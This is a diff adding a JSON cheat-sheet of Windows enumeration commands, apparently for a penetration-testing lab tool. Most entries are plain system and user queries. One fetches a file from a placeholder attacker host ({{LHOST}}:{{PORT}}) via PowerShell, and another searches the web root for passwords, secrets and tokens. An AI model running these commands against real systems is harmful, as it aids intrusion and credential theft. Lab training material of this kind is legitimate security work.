@@ -1,0 +1,12 @@
+[
+  {"section":"Windows","category":"Basics","title":"Current user","command":"whoami /all","description":"Show user, groups, and privileges."},
+  {"section":"Windows","category":"Basics","title":"System info","command":"systeminfo","description":"Show host and OS details."},
+  {"section":"Windows","category":"Network","title":"Network config","command":"ipconfig /all && route print","description":"Show network configuration and routes."},
+  {"section":"Windows","category":"Network","title":"Listening ports","command":"netstat -ano","description":"Show listening ports and PIDs."},
+  {"section":"Windows","category":"Users","title":"Local users","command":"net user","description":"List local users."},
+  {"section":"Windows","category":"Users","title":"Local admins","command":"net localgroup administrators","description":"List local administrators."},
+  {"section":"Windows","category":"Services","title":"Services list","command":"wmic service get name,displayname,pathname,startmode","description":"Review services and paths."},
+  {"section":"Windows","category":"PowerShell","title":"Download file","command":"powershell -c \"Invoke-WebRequest -Uri http://{{LHOST}}:{{PORT}}/file -OutFile file\"","description":"Download from your own lab host."},
+  {"section":"Windows","category":"PowerShell","title":"Find files by name","command":"powershell -c \"Get-ChildItem C:\\ -Recurse -ErrorAction SilentlyContinue -Filter *config*\"","description":"Find config files."},
+  {"section":"Windows","category":"PowerShell","title":"Search text files","command":"powershell -c \"Select-String -Path C:\\inetpub\\wwwroot\\* -Pattern 'password','secret','token' -Recurse\"","description":"Search web root for lab credential keywords."}
+]
